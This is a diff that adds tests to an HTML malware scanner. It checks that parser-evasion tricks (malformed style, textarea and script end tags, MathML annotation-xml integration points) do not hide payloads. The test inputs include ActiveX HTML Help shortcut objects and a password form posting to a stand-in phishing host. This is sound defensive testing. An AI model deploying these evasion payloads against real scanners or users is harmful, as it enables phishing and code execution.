@@ -1036,3 +1036,68 @@ def test_meta_refresh_with_embedded_newline_entity(tmp_path: Path):
         b'</head><body></body></html>'
     )
     assert "HTML_META_REFRESH_SUSPICIOUS" in _rule_ids(_scan(tmp_path, "meta_nl.html", html_bytes))
+
+
+def test_rawtext_and_script_endtags_with_quoted_gt_do_not_swallow_payload(tmp_path: Path):
+    """r14 Blocker 1: quoted '>' inside </style>, </textarea>, </script> end-tag attrs."""
+    cases = [
+        (
+            "style_attr_gt.html",
+            (
+                b'<!DOCTYPE html><html><body>'
+                b'<style></style a="><script>">'
+                b'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
+                b'<param name="Command" value="ShortCut"></object>'
+                b'</body></html>'
+            ),
+            "HTML_CHM_ACTIVEX",
+        ),
+        (
+            "style_slash_gt.html",
+            (
+                b'<!DOCTYPE html><html><body>'
+                b'<style></style/a="><script>">'
+                b'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
+                b'<param name="Command" value="ShortCut"></object>'
+                b'</body></html>'
+            ),
+            "HTML_CHM_ACTIVEX",
+        ),
+        (
+            "textarea_attr_gt.html",
+            (
+                b'<!DOCTYPE html><html><body>'
+                b'<textarea></textarea a="><script>">'
+                b'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
+                b'<param name="Command" value="ShortCut"></object>'
+                b'</body></html>'
+            ),
+            "HTML_CHM_ACTIVEX",
+        ),
+        (
+            "script_slash_gt.html",
+            (
+                b'<!DOCTYPE html><html><body>'
+                b'<script></script/a="><style>">'
+                b'<form action="https://phish.example/steal"><input type="password"></form>'
+                b'</body></html>'
+            ),
+            "HTML_CREDENTIAL_FORM",
+        ),
+    ]
+    for name, payload, expected in cases:
+        assert expected in _rule_ids(_scan(tmp_path, name, payload)), f"Bypassed on {name}"
+
+
+def test_math_annotation_xml_html_ip_treats_mglyph_malignmark_as_html(tmp_path: Path):
+    """r14 Blocker 2: <annotation-xml encoding=text/html> is an HTML integration point."""
+    for tag in ("mglyph", "malignmark"):
+        payload = (
+            "<!DOCTYPE html><html><body>"
+            f'<math><annotation-xml encoding="text/html"><{tag}>'
+            '<![CDATA[><object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
+            '<param name="Command" value="ShortCut"></object>'
+            f"</{tag}></annotation-xml></math>"
+            "</body></html>"
+        ).encode()
+        assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, f"ann_{tag}.html", payload))
